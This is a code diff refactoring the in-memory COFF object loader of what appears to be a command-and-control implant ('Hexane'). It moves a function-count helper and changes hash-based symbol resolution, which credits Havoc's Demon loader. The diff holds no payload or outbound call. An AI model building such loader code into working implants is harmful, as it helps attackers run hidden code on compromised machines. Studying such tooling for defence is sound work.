@@ -132,6 +132,43 @@ namespace Memory {
             return 1;
         }
 
+        SIZE_T GetFunctionMapSize(_executable *object) {
+            HEXANE
+
+            _symbol     *symbol         = { };
+            char        *symbol_name    = { };
+
+            char        buffer[9]       = { };
+            uint32_t    n_funcs         = 0;
+
+            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
+
+                object->section    = SECTION_HEADER(object->buffer, i);
+                object->reloc      = R_CAST(_reloc*, object->section->PointerToRelocations);
+
+                for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
+                    symbol = &object->symbol[object->reloc->SymbolTableIndex];
+
+                    if (!symbol->First.Value[0]) {
+                        symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);
+
+                    } else {
+                        x_memset(buffer, 0, sizeof(buffer));
+                        x_memcpy(buffer, symbol->First.Name, 8);
+
+                        symbol_name = buffer;
+                    }
+                    if (Utils::GetHashFromStringA(symbol_name, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
+                        n_funcs++;
+                    }
+
+                    object->reloc = object->reloc + sizeof(_reloc);
+                }
+            }
+
+            return sizeof(void*) * n_funcs;
+        }
+
         BOOL BaseRelocation(_executable *object) {
             HEXANE
 
@@ -150,7 +187,7 @@ namespace Memory {
                 for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
                     symbol = &object->symbol[object->reloc->SymbolTableIndex];
 
-                    if (symbol->First.Value[0] == 0) {
+                    if (!symbol->First.Value[0]) {
                         entry_name = R_CAST(char*, B_PTR(object->symbol) + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
 
                     } else {
@@ -233,15 +270,12 @@ namespace Memory {
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c#L87
             HEXANE
 
-            uintptr_t   address     = { };
-            char        *lib_name   = { };
-            char        *fn_name    = { };
-            bool        success     = true;
+            bool success = true;
 
             *function = nullptr;
             auto hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));
 
-            if (!(address = Memory::Objects::GetInternalAddress(hash))) {
+            if (!(*function = C_PTR(Memory::Objects::GetInternalAddress(hash)))){
 
             }
             /*
@@ -251,43 +285,6 @@ namespace Memory {
 
             defer:
             return success;
-        }
-
-        SIZE_T GetFunctionMapSize(_executable *object) {
-            HEXANE
-
-            _symbol     *symbol         = { };
-            char        *symbol_name    = { };
-
-            char        buffer[9]       = { };
-            uint32_t    n_funcs         = 0;
-
-            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
-
-                object->section    = SECTION_HEADER(object->buffer, i);
-                object->reloc      = R_CAST(_reloc*, object->section->PointerToRelocations);
-
-                for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
-                    symbol = &object->symbol[object->reloc->SymbolTableIndex];
-
-                    if (symbol->First.Value[0] == 0) {
-                        symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);
-
-                    } else {
-                        x_memset(buffer, 0, sizeof(buffer));
-                        x_memcpy(buffer, symbol->First.Name, 8);
-
-                        symbol_name = buffer;
-                    }
-                    if (Utils::GetHashFromStringA(symbol_name, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
-                        n_funcs++;
-                    }
-
-                    object->reloc = object->reloc + sizeof(_reloc);
-                }
-            }
-
-            return sizeof(void*) * n_funcs;
         }
 
         BOOL MapSections(_executable *object, const uint8_t *const data) {
